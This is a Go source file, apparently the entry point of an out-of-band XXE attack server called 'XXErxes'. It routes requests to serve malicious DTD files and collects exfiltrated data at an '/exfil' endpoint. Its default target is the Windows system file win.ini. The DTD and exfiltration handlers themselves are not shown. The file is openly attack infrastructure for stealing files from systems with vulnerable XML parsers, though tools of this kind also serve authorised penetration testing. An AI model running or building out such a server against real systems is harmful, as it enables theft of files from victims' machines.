package main

import (
	"flag"
	"log"
	"net/http"
	"time"

	"github.com/gorilla/mux"
)

const (
	defaultHTTPPort  string = ":80"
	defaultExfilFile string = "c:/windows/win.ini"
)

type config struct {
	Host      string
	HTTPPort  string
	ExfilFile string
}

func main() {
	rhostPtr := flag.String("rhost", "", "External address of the XXErxes server")
	flag.Parse()

	if *rhostPtr == "" {
		flag.Usage()
		return
	}

	cfg := config{
		Host:      *rhostPtr,
		HTTPPort:  defaultHTTPPort,
		ExfilFile: defaultExfilFile,
	}

	r := mux.NewRouter()
	r.HandleFunc("/dtd/{type:[a-z0-9]+}", dtdHandler(cfg))
	r.HandleFunc("/exfil", exfilHandler())

	srv := &http.Server{
		Handler:      r,
		Addr:         cfg.HTTPPort,
		WriteTimeout: 15 * time.Second,
		ReadTimeout:  15 * time.Second,
	}

	log.Fatal(srv.ListenAndServe())
}
